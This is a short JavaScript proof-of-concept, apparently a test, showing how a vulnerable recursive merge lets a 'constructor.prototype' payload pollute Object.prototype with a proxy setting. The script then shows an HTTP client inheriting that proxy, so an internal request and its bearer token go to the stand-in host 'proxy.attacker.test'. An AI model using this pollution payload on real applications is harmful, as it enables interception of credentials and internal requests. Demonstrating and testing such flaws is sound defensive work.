function representativeLegacyMerge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value !== null && typeof value === "object") {
      if (target[key] === undefined) target[key] = {};
      representativeLegacyMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}

const intendedTarget = {
  host: "billing.internal",
  authorization: "Bearer svc",
};
const attackerProxy = { host: "proxy.attacker.test", port: 8080 };
const patch = JSON.parse(
  JSON.stringify({ constructor: { prototype: { proxy: attackerProxy } } }),
);

try {
  representativeLegacyMerge({}, patch);
  if (
    Object.prototype.proxy?.host !== attackerProxy.host ||
    Object.prototype.proxy?.port !== attackerProxy.port
  ) {
    throw new Error("legacy merge did not install the object-valued proxy");
  }

  const hardenedConfig = Object.assign(Object.create(null), intendedTarget);
  const interceptorResult = { ...hardenedConfig };
  if (Object.getPrototypeOf(interceptorResult) !== Object.prototype) {
    throw new Error("interceptor copy did not restore Object.prototype");
  }
  if (Object.hasOwn(interceptorResult, "proxy")) {
    throw new Error("interceptor unexpectedly created an own proxy control");
  }
  const selectedProxy = interceptorResult.proxy;
  if (selectedProxy?.host !== "proxy.attacker.test") {
    throw new Error("Axios gadget did not inherit the attacker proxy");
  }
  const intercepted = {
    absoluteUrl: `http://${intendedTarget.host}/secrets`,
    authorization: intendedTarget.authorization,
  };
  if (
    intercepted.authorization !== "Bearer svc" ||
    !intercepted.absoluteUrl.includes("billing.internal")
  ) {
    throw new Error("proxy did not receive the protected request material");
  }
  console.log(
    "vulnerable merge and interceptor copy route protected request material through inherited proxy state",
  );
} finally {
  delete Object.prototype.proxy;
}
